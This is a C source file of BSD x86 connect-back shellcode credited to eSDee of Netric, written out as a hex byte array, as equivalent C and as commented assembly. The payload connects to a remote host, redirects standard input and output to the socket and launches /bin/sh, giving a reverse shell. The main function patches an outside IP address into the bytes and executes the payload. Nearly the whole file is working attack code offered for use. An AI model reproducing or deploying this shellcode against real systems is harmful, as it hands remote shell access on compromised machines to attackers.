/* BSD x86 shellcode by eSDee of Netric (www.netric.org)
 * 124 byte - connect back shellcode (port=0xb0ef)
 */

#include <stdio.h>

char
shellcode[] = 
        "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
        "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
        "\x61\xcd\x80\x31\xd2\x52\x52\x68"
        "\x41\x41\x41\x41\x66\x68\xb0\xef"
        "\xb7\x02\x66\x53\x89\xe1\xb2\x10"
        "\x52\x51\x50\x52\x89\xc2\x31\xc0"
        "\xb0\x62\xcd\x80\x31\xdb\x39\xc3"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\x50\x52\x50\xb0\x5a\xcd"
        "\x80\x31\xc0\x31\xdb\x43\x53\x52"
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x43"
        "\x53\x52\x50\xb0\x5a\xcd\x80\x31"
        "\xc0\x50\x68\x2f\x2f\x73\x68\x68"
        "\x2f\x62\x69\x6e\x89\xe3\x50\x54"
        "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
        "\xb0\x01\xcd\x80";

int
c_code()
{
        char *argv[2];
        char *sockaddr = "\x00\x02"
                         "\xb0\xef"
                         "\x7f\x00\x00\x01"
                         "\x00\x00\x00\x00"
                         "\x00\x00\x00\x00";

        int sock;

        sock = socket(2, 1, 6);
        if (connect(sock, sockaddr, 16) < 0) exit();

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        argv[0] = "//bin/sh";
        argv[1] = NULL;

        execve(argv[0], &argv[0], NULL);
        exit();
}

int
asm_code()
{
        __asm("         # sock = socket(2, 1, 6);       
                        xorl    %eax,   %eax
                        xorl    %ebx,   %ebx
                        pushl   %ebx
                        movb    $6,     %bl             # SOCK_STREAM
                        pushl   %ebx
                        movb    $1,     %bl             # IPPROTO_TCP
                        pushl   %ebx
                        movb    $2,     %bl             # AF_INET
                        pushl   %ebx
                        pushl   %esp
                        movb    $97,    %al             # SYS_socket
                        int     $0x80

                        # if (connect(sock, sockaddr, 16) < 0) exit();
                        xorl    %edx,   %edx
                        pushl   %edx
                        pushl   %edx                            
                        pushl   $0x0100007f             # ip address
                        pushw   $0xefb0                 # port
                        movb    $2,     %bh             # address family
                        pushw   %bx
                        movl    %esp,   %ecx
                        movb    $16,    %dl
                        pushl   %edx                    # sizeof(sockaddr)

                        pushl   %ecx
                        pushl   %eax                    # sock
                        pushl   %edx
                        movl    %eax,   %edx
                        xorl    %eax,   %eax
                        movb    $98,    %al             # SYS_connect
                        int     $0x80

                        xorl    %ebx,   %ebx
                        cmpl    %eax,   %ebx
                        je      CONNECTED 
                        xorl    %eax,   %eax
                        movb    $1,     %al             # SYS_exit
                        int     $0x80 

                        CONNECTED:
                        # dup2(sock, 0);
                        xorl    %eax,   %eax
                        pushl   %eax
                        pushl   %edx    
                        pushl   %eax                    # stdin
                        movb    $90,    %al             # dup2
                        int     $0x80

                        # dup2(sock, 1);
                        xorl    %eax,   %eax
                        xorl    %ebx,   %ebx
                        incl    %ebx
                        pushl   %ebx                    # stdout
                        pushl   %edx
                        pushl   %eax 
                        movb    $90,    %al             # dup2
                        int     $0x80

                        # dup2(sock, 2);
                        xorl    %eax,   %eax
                        incl    %ebx
                        pushl   %ebx
                        pushl   %edx
                        pushl   %eax                    # stderr
                        movb    $90,    %al             # dup2
                        int     $0x80

                        # execve(argv[0], &argv[0], NULL);
                        xorl    %eax,   %eax
                        pushl   %eax
                        pushl   $0x68732f2f
                        pushl   $0x6e69622f
                        movl    %esp,   %ebx
                        pushl   %eax
                        pushl   %esp
                        pushl   %ebx
                        pushl   %eax
                        movb    $59,    %al             # SYS_execve
                        int     $0x80                   

                        xorl    %eax,   %eax
                        movb    $1,     %al             # SYS_exit
                        int     $0x80");

}

int
main()
{
        void (*funct)();

        shellcode[24] = 81;     /* ip of www.netric.org :) */
        shellcode[25] = 17;
        shellcode[26] = 46;
        shellcode[27] = 156;

        (long) funct = &shellcode; 
        funct();
        return 0;
}
 
